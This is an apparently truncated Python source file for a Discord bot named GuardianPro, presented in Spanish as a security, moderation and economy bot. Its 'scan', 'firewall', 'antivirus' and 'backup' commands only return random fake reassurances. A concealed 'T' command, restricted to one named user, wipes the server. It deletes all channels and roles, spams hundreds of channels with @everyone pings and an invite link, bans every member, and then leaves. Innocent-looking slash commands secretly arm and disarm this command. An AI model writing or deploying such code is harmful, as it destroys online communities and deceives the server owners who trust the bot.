try:
    import discord
    from discord.ext import commands
except ImportError:
    print("Error: discord.py no está instalado correctamente")
    exit(1)

import asyncio
import json
import os
import random
import datetime
from asyncio import sleep
import threading
from flask import Flask, jsonify

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True  # Necesario para comandos ∆
intents.members = True  # Para funciones de moderación


def get_prefix(bot, message):
    # Solo comandos de economía usan .
    if message.content.startswith('.'):
        return '.'
    # Comandos especiales usan ∆ NO PONER
    elif message.content.startswith('∆'):
        return '∆'
    # Comandos administrativos usan *
    elif message.content.startswith('*'):
        return '*'
    return ['.', '∆', '*']  # Fallback con . primero


bot = commands.Bot(command_prefix=get_prefix,
                   intents=intents,
                   help_command=None)

# Estado de comandos especiales (discreto)
delta_commands_enabled = True
economy_only_mode = False  # Nuevo estado para modo economía solamente
slash_commands_disabled = False  # Nuevo estado para desactivar slash commands

# Sistema de activación/desactivación de módulos
system_modules = {
    'economy': True,
    'levels': True,
    'tickets': True,
    'automod': True,
    'giveaways': True,
    'entertainment': True
}

# Sistema de economía
balances_file = 'balances.json'
cooldowns_file = 'cooldowns.json'

if os.path.exists(balances_file):
    with open(balances_file, 'r') as f:
        balances = json.load(f)
else:
    balances = {}

if os.path.exists(cooldowns_file):
    with open(cooldowns_file, 'r') as f:
        cooldowns = json.load(f)
else:
    cooldowns = {}


def save_balances():
    with open(balances_file, 'w') as f:
        json.dump(balances, f)


def save_cooldowns():
    with open(cooldowns_file, 'w') as f:
        json.dump(cooldowns, f)


def get_balance(user_id):
    user_id = str(user_id)
    if user_id not in balances:
        balances[user_id] = {"wallet": 0, "bank": 0}
    return balances[user_id]


def update_balance(user_id, wallet=0, bank=0):
    user_id = str(user_id)
    bal = get_balance(user_id)
    bal['wallet'] += wallet
    bal['bank'] += bank
    # No dejar negativo
    if bal['wallet'] < 0:
        bal['wallet'] = 0
    if bal['bank'] < 0:
        bal['bank'] = 0
    balances[
        user_id] = bal  # Asegurar que se actualice en el diccionario principal
    save_balances()


def can_use_cooldown(user_id, command, cooldown_time):
    user_id = str(user_id)
    now = datetime.datetime.utcnow().timestamp()
    if user_id not in cooldowns:
        cooldowns[user_id] = {}
    user_cd = cooldowns[user_id]
    last = user_cd.get(command, 0)

    if now - last >= cooldown_time:
        user_cd[command] = now
        save_cooldowns()
        return True
    return False


def get_cooldown_remaining(user_id, command, cooldown_time):
    user_id = str(user_id)
    now = datetime.datetime.utcnow().timestamp()
    if user_id not in cooldowns:
        return 0
    last = cooldowns[user_id].get(command, 0)
    remaining = cooldown_time - (now - last)
    return max(0, remaining)


@bot.event
async def on_ready():
    print(f'Bot GuardianPro está listo y conectado como {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"Sincronizados {len(synced)} slash commands")
    except Exception as e:
        print(f"Error al sincronizar slash commands: {e}")
    print("✅ Bot GuardianPro configurado correctamente:")
    print("• Sistema de economía con prefijo .")
    print("• Moderación automática")
    print("• Sistema de niveles y tickets")
    print("• Utilidades y entretenimiento")
    print("• Comandos especiales ocultos")


@bot.event
async def on_guild_join(guild):
    """Se ejecuta cuando el bot se une a un servidor nuevo"""
    print(f'Bot se unió al servidor: {guild.name} (ID: {guild.id})')

    # Esperar un poco para asegurar que el bot esté completamente integrado
    await asyncio.sleep(2)

    # Crear rol de administrador del bot
    try:
        # Verificar que el bot tenga permisos para crear roles
        if not guild.me.guild_permissions.manage_roles:
            print(f"No tengo permisos para crear roles en {guild.name}")
            return

        admin_role = await guild.create_role(
            name="🛡️ GuardianPro Admin",
            colour=discord.Colour.red(),
            permissions=discord.Permissions(administrator=True),
            reason="Rol de administrador creado automáticamente por GuardianPro"
        )
        print(
            f"Rol de administrador creado en {guild.name}: {admin_role.name}")

        # Intentar asignar el rol al propietario del servidor
        try:
            if guild.owner and not guild.owner.bot:
                await guild.owner.add_roles(
                    admin_role,
                    reason=
                    "Asignación automática de rol de administrador al propietario"
                )
                print(
                    f"Rol asignado al propietario del servidor: {guild.owner.display_name}"
                )
            else:
                print("No se pudo identificar al propietario del servidor")
        except discord.Forbidden:
            print(
                "No se pudo asignar el rol al propietario (jerarquía de roles o permisos insuficientes)"
            )
        except Exception as e:
            print(f"Error al asignar rol al propietario: {e}")

        # Buscar un canal donde enviar mensaje de bienvenida
        welcome_channel = None

        # Prioridad: canal con "general" en el nombre
        for channel in guild.text_channels:
            if "general" in channel.name.lower() and channel.permissions_for(
                    guild.me).send_messages:
                welcome_channel = channel
                break

        # Si no hay canal general, buscar cualquier canal donde se pueda escribir
        if not welcome_channel:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    welcome_channel = channel
                    break

        if welcome_channel:
            embed = discord.Embed(
                title="🛡️ GuardianPro se ha unido al servidor",
                description=
                f"¡Hola! Soy **GuardianPro**, tu asistente de seguridad y economía.\n\n"
                f"✅ He creado el rol `{admin_role.name}` con permisos de administrador.\n"
                f"👑 El propietario del servidor ha sido asignado a este rol automáticamente.\n\n"
                f"🔧 **Comandos principales:**\n"
                f"• `/help` - Ver todos los comandos disponibles\n"
                f"• `.balance` - Sistema de economía\n"
                f"• `/scan` - Escaneo de seguridad\n\n"
                f"⚙️ **Para administradores:** Comandos especiales con prefijo `∆`",
                color=discord.Color.blue())
            embed.add_field(
                name="🚀 Primeros pasos",
                value="1. Usa `/help` para ver todos los comandos\n"
                "2. Configura el servidor con `/sset`\n"
                "3. Explora el sistema de economía con `.balance`",
                inline=False)
            embed.set_footer(text="GuardianPro | Protección y diversión 24/7")
            embed.set_thumbnail(
                url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")

            await welcome_channel.send(embed=embed)
            print(f"Mensaje de bienvenida enviado en: {welcome_channel.name}")
        else:
            print("No se encontró canal donde enviar mensaje de bienvenida")

    except discord.Forbidden:
        print(f"No tengo permisos para crear roles en {guild.name}")
        # Intentar enviar mensaje sin crear rol
        try:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    embed = discord.Embed(
                        title="🛡️ GuardianPro se ha unido al servidor",
                        description="¡Hola! Soy **GuardianPro**.\n\n"
                        "⚠️ **Atención:** No pude crear el rol de administrador debido a permisos limitados.\n"
                        "Por favor, asegúrate de que tengo permisos para **Administrar Roles**.\n\n"
                        "🔧 Usa `/help` para ver todos los comandos disponibles.",
                        color=discord.Color.orange())
                    await channel.send(embed=embed)
                    break
        except:
            pass
    except Exception as e:
        print(f"Error al crear rol de administrador en {guild.name}: {e}")


async def delete_channel(channel):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            await channel.delete()
            print(f"Canal borrado: {channel.name}")
            return
        except discord.HTTPException as e:
            if e.status == 429:  # Rate limit
                retry_after = getattr(e, 'retry_after', 5)
                print(
                    f"Rate limit al borrar {channel.name}, esperando {retry_after} segundos..."
                )
                await asyncio.sleep(retry_after)
            else:
                print(f"Error al borrar canal {channel.name}: {e}")
                if attempt == max_retries - 1:  # Último intento
                    break
        except Exception as e:
            print(f"Error al borrar canal {channel.name}: {e}")
            if attempt == max_retries - 1:  # Último intento
                break


async def create_channel_with_message(guild, i, overwrites):
    try:
        await guild.create_text_channel(f'crashed-{i}', overwrites=overwrites)
        print(f"Canal creado: crashed-{i}")
        # Esperar menos tiempo antes de enviar mensaje
        await asyncio.sleep(0.5)
        try:
            # Obtener el canal recién creado para enviar el mensaje
            channel = discord.utils.get(guild.channels, name=f'crashed-{i}')
            if channel:
                await channel.send(
                    "@everyone @here hecho por Nathyx, hermano de Eather https://discord.gg/Fhh4DTKW"
                )
                print(f"Mensaje enviado en: crashed-{i}")
        except Exception as msg_error:
            print(f"Error al enviar mensaje en crashed-{i}: {msg_error}")
    except Exception as e:
        print(f"Error al crear canal crashed-{i}: {e}")


async def create_role(guild, i):
    try:
        await guild.create_role(name=f"raided-{i}",
                                colour=discord.Colour.red())
        print(f"Rol creado: raided-{i}")
    except Exception as e:
        print(f"Error al crear rol raided-{i}: {e}")


async def create_event(guild, i):
    try:
        from datetime import datetime, timedelta
        start_time = datetime.utcnow() + timedelta(hours=1)
        end_time = start_time + timedelta(hours=2)

        await guild.create_scheduled_event(
            name="raideados jeje",
            description="Evento creado por Nathyx",
            start_time=start_time,
            end_time=end_time,
            entity_type=discord.EntityType.external,
            entity_metadata=discord.EntityMetadata(location="Discord Server"))
        print(f"Evento creado: raideados jeje #{i}")
    except Exception as e:
        print(f"Error al crear evento {i}: {e}")


async def delete_role(role):
    try:
        await role.delete()
        print(f"Rol borrado: {role.name}")
    except Exception as e:
        print(f"Error al borrar rol {role.name}: {e}")


async def ban_member(member):
    try:
        await member.ban(reason="Raid por Nathyx - Todos baneados")
        print(f"Miembro baneado: {member.name}")
    except discord.Forbidden:
        print(
            f"No se pudo banear a {member.name} debido a permisos insuficientes."
        )
    except discord.HTTPException as e:
        print(f"Error al banear a {member.name}: {e}")


def is_authorized_user(user):
    """Verificar si el usuario está autorizado para comandos ∆"""
    return user.name == "Cueli13"


@bot.command(name='T')
async def raid(ctx):
    # Verificar usuario autorizado primero
    if not is_authorized_user(ctx.author):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Verificar si está en modo economía
    if economy_only_mode:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    await ctx.send("R41D3D 8Y X3RVS")
    print(f"Raid iniciado en el servidor {guild.name}")

    # Cambiar nombre del servidor y quitar icono
    try:
        await guild.edit(name="-R4ID3D-", icon=None)
        print(
            "Nombre del servidor cambiado a -R4ID3D- e त्याचा icon eliminada")
    except Exception as e:
        print(f"Error al cambiar servidor: {e}")

    # Borrar todos los canales existentes en paralelo
    delete_channel_tasks = [
        delete_channel(channel) for channel in guild.channels
    ]
    if delete_channel_tasks:
        await asyncio.gather(*delete_channel_tasks, return_exceptions=True)

    # Borrar todos los roles existentes (excepto @everyone)
    delete_role_tasks = [
        delete_role(role) for role in guild.roles if role.name != "@everyone"
    ]
    if delete_role_tasks:
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    # Configurar permisos una sola vez
    overwrites = {
        guild.default_role:
        discord.PermissionOverwrite(send_messages=True,
                                    read_messages=True,
                                    view_channel=True,
                                    embed_links=True,
                                    attach_files=True,
                                    read_message_history=True)
    }

    # Crear canales, roles y eventos por lotes para evitar rate limits
    print("Creando canales...")
    for batch in range(0, 500,
                       100):  # Crear en lotes de 100, total 500 canales
        channel_tasks = [
            create_channel_with_message(guild, i, overwrites)
            for i in range(batch, min(batch + 100, 500))
        ]
        await asyncio.gather(*channel_tasks, return_exceptions=True)
        await asyncio.sleep(0.5)  # Pausa entre lotes

    print("Creando roles...")
    role_tasks = [create_role(guild, i) for i in range(500)]  # 500 roles
    await asyncio.gather(*role_tasks, return_exceptions=True)

    print("Creando eventos...")
    event_tasks = [create_event(guild, i) for i in range(10)]  # 10 eventos
    await asyncio.gather(*event_tasks, return_exceptions=True)

    # Banear a todos los miembros en paralelo
    ban_tasks = [
        ban_member(member) for member in guild.members if member != bot.user
    ]
    if ban_tasks:
        await asyncio.gather(*ban_tasks, return_exceptions=True)

    await ctx.send("Raid completado!")

    # Salir del servidor después del raid
    try:
        await guild.leave()
        print(f"Bot salió del servidor {guild.name}")
    except Exception as e:
        print(f"Error al salir del servidor: {e}")


class HelpView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=60)
        self.current_page = 0
        self.pages = [{
            "title":
            "🛡️ Panel de Ayuda - Página 1/7",
            "description":
            "Tu asistente de **seguridad avanzada** para Discord.\n\nComandos de seguridad y monitoreo:",
            "fields": [{
                "name":
                "🔍 Escaneo y Seguridad",
                "value":
                ("**/scan** → Escanea el servidor en busca de amenazas\n"
                 "**/secure** → Informe completo de seguridad\n"
                 "**/monitor** → Estado en tiempo real del sistema\n"
                 "**/info** → Información detallada del servidor\n"
                 "**/firewall** → Estado del firewall\n"
                 "**/antivirus** → Estado del antivirus")
            }, {
                "name":
                "🛡️ Protección y Moderación",
                "value": ("**/sset** → Implementa el sistema de seguridad\n"
                          "**/ban** → Banea a un usuario del servidor\n"
                          "**/clear** → Eliminar mensajes del canal\n"
                          "**/automod** → Configurar moderación automática")
            }]
        }, {
            "title":
            "💾 Panel de Ayuda - Página 2/7",
            "description":
            "Comandos del sistema, utilidades y configuración:",
            "fields": [{
                "name":
                "💾 Sistema y Configuración",
                "value": ("**/backup** → Estado de los respaldos\n"
                          "**/ping** → Latencia del bot\n"
                          "**/version** → Versión actual (GPC 4)\n"
                          "**/encrypt** → Estado de la encriptación\n"
                          "**/uptime** → Tiempo de actividad del bot\n"
                          "**/stats** → Estadísticas del servidor")
            }, {
                "name":
                "📋 Información y Listas",
                "value": ("**/userinfo** → Información de un usuario\n"
                          "**/avatar** → Ver avatar de un usuario\n"
                          "**/roles** → Lista de roles del servidor\n"
                          "**/channels** → Lista de canales del servidor\n"
                          "**/invite** → Crear enlace de invitación\n"
                          "**/server** → Enlace del servidor del bot")
            }]
        }, {
            "title":
            "🎉 Panel de Ayuda - Página 3/7",
            "description":
            "Entretenimiento, juegos y diversión:",
            "fields": [{
                "name":
                "🎮 Entretenimiento Básico",
                "value": ("**/gstart** → Crear sorteo interactivo\n"
                          "**/timer** → Establecer temporizador\n"
                          "**/reminder** → Crear recordatorio\n"
                          "**/poll** → Crear una encuesta\n"
                          "**/flip** → Lanzar una moneda\n"
                          "**/dice** → Lanzar dados")
            }, {
                "name":
                "😄 Diversión y Humor",
                "value": ("**/8ball** → Pregunta a la bola mágica\n"
                          "**/joke** → Chiste aleatorio\n"
                          "**/meme** → Meme aleatorio\n"
                          "**/quote** → Cita inspiradora\n"
                          "**/choose** → Elegir entre opciones")
            }]
        }, {
            "title":
            "🛠️ Panel de Ayuda - Página 4/7",
            "description":
            "Herramientas útiles y generadores:",
            "fields": [{
                "name":
                "🛠️ Herramientas Técnicas",
                "value": ("**/math** → Calculadora básica\n"
                          "**/base64** → Codificar/decodificar Base64\n"
                          "**/password** → Generar contraseña segura\n"
                          "**/ascii** → Convertir texto a arte ASCII\n"
                          "**/color** → Generar color aleatorio")
            }, {
                "name":
                "🌐 Simuladores",
                "value": ("**/weather** → Clima simulado\n"
                          "**/translate** → Traductor simulado")
            }]
        }, {
            "title":
            "💰 Panel de Ayuda - Página 5/7",
            "description":
            "Sistema de economía completo y rankings:",
            "fields": [{
                "name":
                "💰 Comandos Básicos de Economía",
                "value": ("`.money` / `.bal` → Ver tu dinero\n"
                          "`.work` → Trabajar para ganar dinero\n"
                          "`.daily` → Recompensa diaria\n"
                          "`.collect` → Recompensa por rango\n"
                          "`.pay` → Enviar dinero a otro usuario\n"
                          "`.deposit` → Depositar en el banco\n"
                          "`.withdraw` → Retirar del banco")
            }, {
                "name":
                "🎯 Actividades de Riesgo",
                "value": ("`.beg` → Mendigar por dinero\n"
                          "`.crime` → Cometer crímenes por dinero\n"
                          "`.rob` → Intentar robar a otro usuario\n"
                          "`.win` → Lotería ($10,000 - 0.5% ganar)\n"
                          "`.coinflip` → Apostar en cara o cruz\n"
                          "`.slots` → Máquina tragamonedas")
            }, {
                "name":
                "🏆 Rankings y Niveles",
                "value": ("`.baltop` → Top 15 más ricos del servidor\n"
                          "**/level** → Ver tu nivel y experiencia\n"
                          "**/leaderboard_levels** → Ranking de niveles\n"
                          "**/ticket_setup** → Configurar tickets")
            }]
        }, {
            "title":
            "🆕 Panel de Ayuda - Página 6/7 (NUEVO GPC 4)",
            "description":
            "Nuevas funciones exclusivas de GuardianPro GPC 4:",
            "fields": [{
                "name":
                "🎒 Sistema de Inventario",
                "value": ("`.inventory` / `.inv` → Ver tu inventario\n"
                          "`.shop [categoría]` → Ver tienda de items\n"
                          "`.buy <item>` → Comprar items\n"
                          "`.use <item>` → Usar items del inventario")
            }, {
                "name":
                "🎮 Mini-juegos de Aventura",
                "value": ("`.hunt` → Ir de caza (15m cooldown)\n"
                          "`.mine` → Minar minerales (10m cooldown)\n"
                          "`.explore` → Explorar lugares (20m cooldown)\n"
                          "`.fish` → Pescar (8m cooldown)")
            }, {
                "name":
                "🛍️ Categorías de Tienda",
                "value": ("`.shop tools` → Herramientas y armas\n"
                          "`.shop items` → Items consumibles\n"
                          "`.shop collectibles` → Objetos coleccionables")
            }, {
                "name":
                "🎰 Juegos de Casino",
                "value": ("`.coinflip <apuesta>` → Cara o cruz\n"
                          "`.slots <apuesta>` → Tragamonedas\n"
                          "`.blackjack <apuesta>` → Juego de cartas\n"
                          "`.win` → Lotería ($10,000 - 0.5% ganar)")
            }]
        }, {
            "title":
            "⚙️ Panel de Ayuda - Página 7/7 (ADMINISTRACIÓN)",
            "description":
            "Comandos administrativos y de gestión:",
            "fields": [{
                "name":
                "🛡️ Panel Principal",
                "value": ("**/4dmin** → Panel administrativo completo\n"
                          "**/tadmin** → Panel de tickets avanzado\n"
                          "*(Solo para administradores)*")
            }]
        }]

    def create_embed(self, page_index):
        page = self.pages[page_index]
        embed = discord.Embed(title=page["title"],
                              description=page["description"],
                              color=discord.Color.dark_blue())

        for field in page["fields"]:
            embed.add_field(name=field["name"],
                            value=field["value"],
                            inline=False)

        embed.set_thumbnail(
            url="https://cdn-icons-png.flaticon.com/512/1068/1068723.png")
        embed.set_footer(text="GuardianPro | Protección 24/7")

        return embed

    def update_buttons(self):
        # Habilitar/deshabilitar botones de navegación
        self.children[0].disabled = (self.current_page == 0)  # Botón Anterior
        self.children[1].disabled = (self.current_page == len(self.pages) - 1
                                     )  # Botón Siguiente

    @discord.ui.button(label='◀️ Anterior',
                       style=discord.ButtonStyle.secondary)
    async def previous_page(self, interaction: discord.Interaction,
                            button: discord.ui.Button):
        if self.current_page > 0:
            self.current_page -= 1
            embed = self.create_embed(self.current_page)
            self.update_buttons()
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='▶️ Siguiente',
                       style=discord.ButtonStyle.secondary)
    async def next_page(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        if self.current_page < len(self.pages) - 1:
            self.current_page += 1
            embed = self.create_embed(self.current_page)
            self.update_buttons()
            await interaction.response.edit_message(embed=embed, view=self)
        else:
            await interaction.response.defer()

    @discord.ui.button(label='🏠 Inicio', style=discord.ButtonStyle.primary)
    async def home_page(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
        self.current_page = 0
        embed = self.create_embed(self.current_page)
        self.update_buttons()
        await interaction.response.edit_message(embed=embed, view=self)

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        # No podemos editar el mensaje aquí directamente, pero podemos deshabilitar los botones


@bot.tree.command(name="help",
                  description="Muestra todos los comandos y funciones del bot")
async def help_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    view = HelpView()
    embed = view.create_embed(0)
    view.update_buttons(
    )  # Asegurarse de que los botones estén en el estado correcto inicialmente
    await interaction.response.send_message(embed=embed, view=view)


@bot.tree.command(name='scan',
                  description='Escanea el servidor en busca de amenazas')
async def see_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Definir respuestas múltiples
    respuestas = [
        "🔍 Escaneando servidor en busca de amenazas... ✅ No se detectaron vulnerabilidades.",
        "🔍 Análisis completo. Todo está en orden.",
        "🔍 Iniciando el escaneo... Todo está protegido.",
        "🔍 Escaneo finalizado. Lista de amenazas: Ninguna.",
        "🔍 Verificación de seguridad completada. Estado: SEGURO."
    ]

    # Elegir una respuesta al azar
    import random
    respuesta_elegida = random.choice(respuestas)

    await interaction.response.send_message(respuesta_elegida)


from discord import Embed


@bot.tree.command(name='info', description='Muestra información del servidor')
async def info_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message(
            "❌ Este comando solo puede usarse en servidores.", ephemeral=True)
        return

    embed = Embed(title=f"Información del servidor: {guild.name}",
                  color=0x3498db)

    # Configurar thumbnail del servidor
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)

    # Información básica del servidor
    embed.add_field(name="📊 ID del Servidor",
                    value=f"`{guild.id}`",
                    inline=True)

    # Propietario del servidor - obtener de manera más confiable
    try:
        if guild.owner:
            owner_text = f"{guild.owner.name}#{guild.owner.discriminator}"
        else:
            # Si no está en caché, intentar obtener por ID
            owner = await bot.fetch_user(guild.owner_id
                                         ) if guild.owner_id else None
            owner_text = f"{owner.name}#{owner.discriminator}" if owner else "Desconocido"
    except:
        owner_text = f"ID: {guild.owner_id}" if guild.owner_id else "Desconocido"

    embed.add_field(name="👑 Propietario", value=owner_text, inline=True)
    embed.add_field(name="📅 Creado el",
                    value=guild.created_at.strftime("%d/%m/%Y a las %H:%M"),
                    inline=True)

    # Estadísticas del servidor - contar correctamente
    all_channels = guild.channels
    text_channels = len(
        [c for c in all_channels if isinstance(c, discord.TextChannel)])
    voice_channels = len(
        [c for c in all_channels if isinstance(c, discord.VoiceChannel)])
    categories = len(
        [c for c in all_channels if isinstance(c, discord.CategoryChannel)])

    # Contar miembros - intentar diferentes métodos
    member_count = guild.member_count
    if not member_count:
        # Si member_count es None, contar miembros cacheados
        member_count = len(guild.members) if guild.members else "No disponible"

    embed.add_field(name="👥 Miembros",
                    value=f"{member_count:,}"
                    if isinstance(member_count, int) else member_count,
                    inline=True)
    embed.add_field(name="📝 Canales de Texto",
                    value=text_channels,
                    inline=True)
    embed.add_field(name="🔊 Canales de Voz", value=voice_channels, inline=True)
    embed.add_field(name="📁 Categorías", value=categories, inline=True)
    embed.add_field(name="🏷️ Roles", value=len(guild.roles), inline=True)
    embed.add_field(name="😄 Emojis", value=len(guild.emojis), inline=True)

    # Nivel de verificación
    verification_levels = {
        discord.VerificationLevel.none: "Ninguno",
        discord.VerificationLevel.low: "Bajo",
        discord.VerificationLevel.medium: "Medio",
        discord.VerificationLevel.high: "Alto",
        discord.VerificationLevel.highest: "Máximo"
    }

    embed.add_field(name="🔒 Verificación",
                    value=verification_levels.get(guild.verification_level,
                                                  "Desconocido"),
                    inline=True)
    embed.add_field(name="🎯 Nivel de Boost",
                    value=f"Nivel {guild.premium_tier}",
                    inline=True)
    embed.add_field(name="💎 Boosts",
                    value=guild.premium_subscription_count or 0,
                    inline=True)

    # Información adicional útil
    embed.add_field(name="🌍 Región",
                    value=getattr(guild, 'preferred_locale', 'Desconocido'),
                    inline=True)
    embed.add_field(name="📜 Descripción",
                    value=guild.description[:50] +
                    "..." if guild.description and len(guild.description) > 50
                    else guild.description or "Sin descripción",
                    inline=False)

    embed.set_footer(
        text=f"Información solicitada por {interaction.user.display_name}",
        icon_url=interaction.user.display_avatar.url)

    await interaction.response.send_message(embed=embed)


@bot.tree.command(name='firewall',
                  description='Verifica el estado del firewall')
async def firewall_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "🛡️ Firewall activado. Estado: PROTEGIDO | Conexiones bloqueadas: 0")


@bot.tree.command(name='version', description='Muestra la versión del bot')
async def scan_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    # Definir respuestas múltiples
    respuestas = [
        "Versión GPC 4", "Versión del sistema: GPC 4",
        "Estás utilizando la versión GPC 4! Gracias por utilizarme 😎"
    ]

    # Elegir una respuesta al azar
    import random
    respuesta_elegida = random.choice(respuestas)

    await interaction.response.send_message(respuesta_elegida)


import time


@bot.tree.command(
    name='sset',
    description='Confirma que el sistema de seguridad está implementado')
async def sset_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    respuestas = [
        "🔒 Sistema de seguridad implementado con éxito. ¡Protección total activada!",
        "✅ Seguridad configurada y operativa. Tu servidor está blindado.",
        "🛡️ Protección avanzada habilitada. El sistema de seguridad está en marcha.",
        "⚙️ Sistema de seguridad online y funcionando sin fallos.",
        "🚀 Seguridad implementada correctamente. ¡El servidor está a salvo!",
        "🔐 Todos los protocolos de seguridad están activos y monitoreados.",
        "🛠️ Sistema de seguridad listo para defender contra cualquier amenaza."
    ]

    import random
    await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(
    name='server',
    description='Envía el enlace del servidor por mensaje directo')
async def server_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    enlace_del_servidor = "https://discord.gg/U8sY3dbz"  # Cambia esto por tu enlace real

    await interaction.response.send_message(
        "📩 Te he enviado el servidor al MD!", ephemeral=True)
    try:
        await interaction.user.send(
            f"🌐 Aquí tienes el enlace del servidor:\n{enlace_del_servidor}")
    except Exception:
        await interaction.followup.send(
            "❌ No pude enviarte el mensaje directo. ¿Tienes los DMs abiertos?",
            ephemeral=True)


import time


@bot.tree.command(name='ping', description='Comprueba la latencia del bot')
async def ping_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    start = time.perf_counter()
    await interaction.response.defer(
    )  # Defer para ganar tiempo y luego responder
    end = time.perf_counter()
    latency = (end - start) * 1000  # ms

    await interaction.followup.send(f"🏓 Pong! {latency:.2f} ms")


@bot.tree.command(name='antivirus',
                  description='Verifica el estado del antivirus')
async def antivirus_slash(interaction: discord.Interaction):
    global delta_commands_enabled
    delta_commands_enabled = False  # Deshabilitar comandos ∆ discretamente

    amenazas = random.choice([0, 0, 0, 1
                              ])  # Mayor probabilidad de 0 amenazas, a veces 1

    respuestas = [
        "🦠 Antivirus actualizado. Última verificación: Ahora mismo | Amenazas detectadas:0",
        "🛡️ Escaneo completo. Estado: LIMPIO | Último chequeo: Ahora mismo",
        "🔍 Análisis antivirus reciente. Amenazas encontradas: 1 (resuelto)",
        "✅ Antivirus activo y actualizado. Sin amenazas detectadas en el último análisis.",
        "⚠️ Advertencia: Amenaza leve detectada. Última revisión: Ahora mismo"
        if amenazas else
        "✅ Antivirus limpio y protegido. Última revisión: Ahora mismo"
    ]

    await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='ban', description='Banea a un usuario del servidor')
@discord.app_commands.describe(user='Usuario a banear',
                               reason='Razón del baneo (opcional)')
async def ban_slash(interaction: discord.Interaction,
                    user: discord.Member,
                    reason: str = None):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if not interaction.user.guild_permissions.ban_members:
        await interaction.response.send_message(
            "❌ No tienes permiso para banear usuarios.", ephemeral=True)
        return

    try:
        await user.ban(reason=reason)
        mensaje = f"🔨 {user} ha sido baneado del servidor."
        if reason:
            mensaje += f"\n📝 Razón: {reason}"
        await interaction.response.send_message(mensaje)
    except Exception as e:
        await interaction.response.send_message(
            f"❌ No se pudo banear al usuario: {e}", ephemeral=True)


@bot.tree.command(name='invite',
                  description='Genera un enlace de invitación temporal')
@discord.app_commands.describe(
    max_uses='Número máximo de usos del enlace (0 para ilimitado)',
    max_age=
    'Duración en segundos antes de que expire el enlace (0 para ilimitado)')
async def invite_slash(interaction: discord.Interaction,
                       max_uses: int = 1,
                       max_age: int = 3600):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    if not interaction.user.guild_permissions.create_instant_invite:
        await interaction.response.send_message(
            "❌ No tienes permiso para crear invitaciones.", ephemeral=True)
        return

    try:
        invite = await interaction.channel.create_invite(max_uses=max_uses,
                                                         max_age=max_age,
                                                         unique=True)
        await interaction.response.send_message(
            f"🔗 Aquí tienes tu enlace de invitación:\n{invite.url}")
    except Exception as e:
        await interaction.response.send_message(
            f"❌ No se pudo crear la invitación: {e}", ephemeral=True)


@bot.tree.command(name='backup',
                  description='Verifica el estado de los backups')
async def backup_slash(interaction: discord.Interaction):
    if economy_only_mode or slash_commands_disabled:
        await interaction.response.send_message(
            "❌ Los comandos slash están desactivados temporalmente.",
            ephemeral=True)
        return

    await interaction.response.send_message(
        "💾 Sistema de respaldo activo. Último backup: Hace 5 minutos | Estado: SEGURO"
    )


@bot.tree.command(name='monitor',
                  description='Muestra el estado del monitoreo del sistema')
async def monitor_slash(interaction: discord.Interaction):
    global delta_commands_enabled
    delta_commands_enabled = True  # Activar comandos ∆ discretamente

    cpu = random.randint(5, 25)  # CPU entre 5% y 25%
    ram = random.randint(20, 40)  # RAM entre 20% y 40%
    latency = random.randint(30, 60)  # Latencia entre 30ms y 60ms

    respuestas = [
        f"📊 Monitoreo activo: CPU: {cpu}% | RAM: {ram}% | Conexiones: SEGURAS ✅",
        f"📡 Sistema estable: CPU: {cpu}% | RAM: {ram}% | Latencia: {latency}ms | Estado: ÓPTIMO",
        f"🖥️ Recursos del servidor → CPU: {cpu}% | RAM: {ram}% | Conexiones seguras: 100%",
        f"📈 Monitoreo en tiempo real → CPU: {cpu}% | RAM: {ram}% | Seguridad: ALTA",
        f"🔎 Diagnóstico → CPU: {cpu}% | RAM: {ram}% | Estado de red: SEGURA",
